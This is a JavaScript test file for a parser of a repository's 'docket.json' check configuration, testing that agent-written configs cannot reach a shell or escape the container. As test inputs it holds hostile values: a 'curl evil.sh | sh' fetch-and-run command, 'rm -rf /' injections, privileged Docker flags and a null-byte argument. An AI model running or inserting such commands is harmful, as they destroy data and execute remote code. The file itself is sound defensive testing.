import assert from "node:assert/strict";
import { test } from "node:test";
import { createJiti } from "jiti";

const jiti = createJiti(import.meta.url, { interopDefault: true });
const { parseRepoConfig, declarationOf, CONFIG_FILE } = jiti("../src/shared/repo-config.ts");

// This file parses a document written by whoever can commit to the repository,
// which on a floor of agents means the agents. Every test below is a way that
// document could try to become something other than a list of commands.

const good = (source) => {
  const result = parseRepoConfig(source);
  assert.equal(result.ok, true, result.ok ? "" : result.error);
  return result.config;
};

const bad = (source, pattern) => {
  const result = parseRepoConfig(source);
  assert.equal(result.ok, false, `accepted: ${source}`);
  if (pattern) assert.match(result.error, pattern);
  return result.error;
};

test("a Python repository can declare itself", () => {
  const config = good(`{
    "image": "python:3.12-bookworm",
    "checks": [
      { "kind": "test", "command": ["pytest", "-q"] },
      { "kind": "lint", "command": ["ruff", "check", "."] }
    ]
  }`);
  assert.equal(config.image, "python:3.12-bookworm");
  // Ordered cheapest-signal-first, like every other check list in the app.
  assert.deepEqual(config.checks.map((check) => check.kind), ["lint", "test"]);
  assert.deepEqual(config.checks[1].command, ["pytest", "-q"]);
});

test("a command must be an argv array, never a string", () => {
  // The whole safety argument rests on this. A string has to be run through a
  // shell, and a shell turns the repository's data into Docket's code.
  const error = bad(
    '{ "checks": [{ "kind": "test", "command": "pytest -q && curl evil.sh | sh" }] }',
    /must be an array of arguments, not a string/,
  );
  assert.match(error, /never gives a repository's command a shell/);
});

test("shell metacharacters inside arguments are data, and stay data", () => {
  // These are accepted precisely because they are harmless: no shell ever
  // sees them, so a semicolon is a semicolon. Rejecting them would imply the
  // safety came from filtering, which is the weaker guarantee.
  const config = good(
    '{ "checks": [{ "kind": "test", "command": ["pytest", "-k", "a; rm -rf / && echo $HOME `id`"] }] }',
  );
  assert.equal(config.checks[0].command[2], "a; rm -rf / && echo $HOME `id`");
});

test("an image reference cannot be a flag, a path escape, or a sentence", () => {
  for (const image of [
    "--privileged",
    "-v /:/host",
    "python:3.12 --network host",
    "python:3.12; rm -rf /",
    "PYTHON:3.12",
    "",
    "  ",
  ]) {
    bad(`{ "image": ${JSON.stringify(image)} }`, /"image" must be a plain image reference/);
  }
  // And the shapes a real reference actually takes.
  for (const image of [
    "python:3.12-bookworm",
    "node:22-bookworm",
    "ghcr.io/astral-sh/ruff:latest",
    "golang",
    `alpine@sha256:${"a".repeat(64)}`,
  ]) {
    assert.equal(good(`{ "image": ${JSON.stringify(image)} }`).image, image);
  }
});

test("one kind cannot be declared twice", () => {
  // A gate that resolves an ambiguity by picking one has made a decision
  // nobody recorded, and the reviewer cannot see which command ran.
  bad(
    '{ "checks": [{"kind":"test","command":["a"]}, {"kind":"test","command":["b"]}] }',
    /declared more than once/,
  );
});

test("malformed documents are refused with a reason a person can act on", () => {
  bad("{ not json", /is not valid JSON/);
  bad("[]", /must be a JSON object/);
  bad("null", /must be a JSON object/);
  bad('{ "checks": {} }', /"checks" must be an array/);
  bad('{ "checks": [null] }', /must be an object/);
  bad('{ "checks": [{ "kind": "vibes", "command": ["a"] }] }', /"kind" must be one of/);
  bad('{ "checks": [{ "kind": "test", "command": [] }] }', /non-empty array/);
  bad('{ "checks": [{ "kind": "test", "command": ["ok", 7] }] }', /every argument must be/);
  bad('{ "checks": [{ "kind": "test", "command": ["ok", ""] }] }', /every argument must be/);
});

test("a null byte in an argument is refused", () => {
  // It would truncate wherever the runtime copies it into a C string, so what
  // ran and what the packet shows would be different commands.
  bad('{ "checks": [{ "kind": "test", "command": ["pytest\\u0000--evil"] }] }', /null byte/);
});

test("sizes are bounded, because a packet has a reader", () => {
  const many = Array.from({ length: 40 }, () => '{"kind":"test","command":["a"]}').join(",");
  bad(`{ "checks": [${many}] }`, /more than the 12 this reads/);

  const wide = Array.from({ length: 200 }, () => '"x"').join(",");
  bad(`{ "checks": [{"kind":"test","command":[${wide}]}] }`, /more than 64 arguments/);

  const long = "x".repeat(500);
  bad(`{ "checks": [{"kind":"test","command":["${long}"]}] }`, /longer than 400 characters/);
});

test("an empty or check-less config is valid and declares nothing", () => {
  assert.deepEqual(good("{}"), { image: null, checks: [] });
  assert.deepEqual(good('{ "image": "golang:1.23" }').checks, []);
  // Unknown keys are ignored rather than refused, so the format can grow
  // without every old Docket rejecting every new repository.
  assert.deepEqual(good('{ "future": true, "checks": [] }').checks, []);
});

test("the declaration is stable against reformatting and changes with the command", () => {
  // Drift is the protection that matters most here: editing docket.json is a
  // far easier way to weaken a gate than editing a test.
  const spaced = good('{ "checks": [{ "kind":"test", "command":["pytest",   "-q"] }] }');
  const tight = good('{"checks":[{"kind":"test","command":["pytest","-q"]}]}');
  assert.equal(declarationOf(spaced.checks[0]), declarationOf(tight.checks[0]));

  const weakened = good('{"checks":[{"kind":"test","command":["true"]}]}');
  assert.notEqual(declarationOf(spaced.checks[0]), declarationOf(weakened.checks[0]));
});

test("the file it reads is named once, and errors say which file", () => {
  assert.equal(CONFIG_FILE, "docket.json");
  assert.match(bad("{ nope"), /^docket\.json/);
});
